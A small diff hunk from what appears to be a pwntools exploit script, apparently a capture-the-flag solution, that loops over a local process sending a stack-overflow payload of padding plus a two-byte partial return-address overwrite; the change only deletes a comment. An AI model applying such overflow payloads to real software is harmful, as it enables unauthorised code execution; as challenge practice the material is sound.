@@ -10,7 +10,6 @@ padding = b"A" * 0x40 + b"B" * 8
 for count in itertools.count():
     p = process(binary_path)
 
-    # 0x00001a2b
     win_val = p16(0x1A2B)
     payload = padding + win_val
     p.send(payload)
